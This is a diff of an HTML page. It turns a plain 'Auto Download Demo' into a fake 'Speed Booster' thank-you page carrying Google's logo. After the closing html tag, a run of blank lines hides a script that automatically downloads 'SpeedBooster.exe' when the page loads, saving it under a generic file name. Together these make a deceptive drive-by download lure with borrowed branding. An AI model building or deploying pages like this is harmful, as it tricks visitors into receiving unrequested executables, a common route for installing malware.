@@ -1,20 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Auto Download Demo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Speed Booster - Thank You</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #5f6368;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 272px;
+      height: 92px;
+    }
+
+    .message {
+      margin-top: 30px;
+      font-size: 20px;
+      color: #202124;
+    }
+
+    .highlight {
+      color: #1a73e8;
+      font-weight: bold;
+    }
+
+    @media (max-width: 600px) {
+      .message {
+        font-size: 18px;
+        padding: 0 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <h1>Download should start automatically</h1>
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" />
+  </div>
+
+  <div class="message">
+    Thank you for using <span class="highlight">Speed Booster</span>
+  </div>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
   <script>
     window.onload = function() {
       const a = document.createElement('a');
-      a.href = 'testfile.exe'; // Replace with your file URL
+      a.href = 'SpeedBooster.exe'; // Replace with your file URL
       a.download = 'downloaded-file.exe'; // Optional: force filename
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
     };
   </script>
-</body>
-</html>
